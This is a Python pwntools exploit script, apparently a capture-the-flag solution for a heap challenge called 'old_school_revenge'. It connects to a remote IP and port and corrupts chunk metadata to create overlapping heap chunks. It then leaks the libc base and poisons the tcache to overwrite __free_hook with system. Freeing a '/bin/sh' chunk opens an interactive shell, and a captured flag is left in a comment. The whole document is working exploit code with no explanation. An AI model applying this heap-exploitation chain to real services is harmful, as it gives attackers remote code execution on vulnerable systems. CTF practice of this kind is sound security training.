from pwn import *

#context.log_level = 'debug'

p = remote('123.60.63.39','49153')
#p = process('./old_school_revenge')
elf = ELF('./old_school_revenge')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc-2.27.so')

def cmd(ch):
    p.sendlineafter('Your choice: ',str(ch))

def new(idx,size):
    cmd(1)
    p.sendlineafter('Index: ',str(idx))
    p.sendlineafter('Size: ',str(size))

def edit(idx,con):
    cmd(2)
    p.sendlineafter('Index: ',str(idx))
    p.sendafter('Content: ',con)

def show(idx):
    cmd(3)
    p.sendlineafter('Index: ',str(idx))

def free(idx):
    cmd(4)
    p.sendlineafter('Index: ',str(idx))

new(0,0xf8)
for i in range(11):
    new(i+1,0xf8)
for i in range(7):
    free(i+1)
free(0)

for i in range(7):
    new(7-i,0xf8)

edit(8,b'A'*0xf0+p64(0x900))
for i in range(7):
    free(8-i)
free(9)

for i in range(7):
    new(2+i,0xf8)
new(20,0xf8)
show(1)
p.recvuntil('Content: ')
libc_base = u64(p.recv(6)+b'\x00\x00')-0x3ebca0
p.info('libc_base: '+hex(libc_base))
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']
new(21,0xf8)
free(3)
free(1)
edit(21,p64(free_hook-0x8)+b'A'*0x8+b'\n')
new(22,0xf8)
new(23,0xf8)
edit(23,b'/bin/sh\x00'+p64(system)+b'\n')
free(23)


#gdb.attach(p)
p.interactive()
#flag{chz1IrUaAgSELXLciMeRB2XMeWQVZAKl}


